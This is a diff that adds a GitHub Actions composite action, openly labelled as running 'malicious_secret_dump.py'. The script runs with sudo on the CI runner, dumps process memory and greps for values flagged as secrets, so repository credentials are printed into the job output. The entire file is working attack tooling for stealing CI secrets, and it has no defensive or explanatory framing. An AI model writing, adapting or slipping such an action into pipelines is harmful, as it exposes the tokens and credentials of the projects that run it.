@@ -1,0 +1,25 @@
+name: "Memory Dumper Action"
+description: "Extracts secrets from memory using malicious_secret_dump.py"
+author: "Your Name"
+branding:
+  icon: "cpu"
+  color: "red"
+inputs:
+  script-path:
+    description: "Path to malicious_secret_dump.py"
+    required: false
+    default: "./malicious_secret_dump.py"
+outputs:
+  secrets:
+    description: "Extracted secrets from memory"
+runs:
+  using: "composite"
+  steps:
+    - name: Install dependencies
+      run: sudo apt update && sudo apt install -y python3
+      shell: bash
+
+    - name: Dump memory
+      run: |
+        sudo python3 ${{ inputs.script-path }} | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
+      shell: bash
